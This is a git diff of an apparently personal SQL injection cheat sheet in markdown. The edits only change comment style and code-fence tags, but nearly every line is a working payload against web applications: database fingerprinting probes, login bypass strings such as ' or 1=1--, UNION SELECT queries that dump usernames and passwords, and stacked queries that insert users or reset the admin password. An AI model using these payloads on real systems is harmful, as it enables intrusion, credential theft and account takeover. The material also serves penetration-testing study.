@@ -193,7 +193,7 @@ DB Specific SQLi Cheatsheets: http://pentestmonkey.net/cheat-sheet/sql-injection
 Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targetsite.com/price.php?id=1+1`
 
 DB fingerprinting techniques:
-```
+```sql
 /* MySQL */                                                        -- FINGERPRINTING:        
    http://www.example.com/news.php?id=1 /*! AND 1=1 */--           -- via. comments
    http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   -- via. MySQL CONCAT()
@@ -211,26 +211,27 @@ DB fingerprinting techniques:
 ```
 
 Enumerate DB metadata via. views:
-```
---MySQL (db.information_schema)
+```sql
+/* MySQL (db.information_schema) */
   SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
   SELECT * FROM INFORMATION_SCHEMA.TABLES;
   
---Sqlite (db.sqlite_master)
+/* Sqlite (db.sqlite_master) */
   SELECT name FROM sqlite_master WHERE type='table';
 ```
 
 Authentication Bypass:
 ```sql
--- Auth Form Bypass Example: SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
+/* Auth Form Bypass Example: */
+  SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
   [user_field]’ OR 1=1; /*
   [pass_field]*/--
   
--- Other things try:
+/* Other things try */
   admin' --
-  ' or 1=1--
+  ' or 1=1-- 
   ' or '1'='1
-  ' or '1'='1 --
+  ' or '1'='1 -- 
 ```
 
 Blind SQLi (Boolean / Time-based)
@@ -249,7 +250,7 @@ UNION SELECT (exfiltrating data):
 ns.agency/stuff.php?id=3 order by 1                                  
 ns.agency/stuff.php?id=0' union select 1,version(),database()--    // (MySQL) version + db name
 
--- Dump usernames and passwords (MySQL)
+/* Dump usernames and passwords (MySQL) */
     -- list names of tables within the current database [result=emails, referers, uagents, users]
     ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()--
     -- list names of columns within the "users" table [result=id, username, password]
@@ -260,11 +261,11 @@ ns.agency/stuff.php?id=0' union select 1,version(),database()--    // (MySQL) ve
 
 INSERT / UPDATE (adding or changing data):
 ```sql
--- Insert new users (MySQL)
+/* Insert new users (MySQL) */
     -- insert a new row into the "users" table with values id=99, username=newuser, password=newpass
     ns.agency/stuff.php?id=0'; insert into users(id,username,password) values ('99','newuser','newpass');--
 
--- Update admin password (MySQL)
+/* Update admin password (MySQL) */
     -- set password="1234" for a user called "admin"
     ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";--
 ```
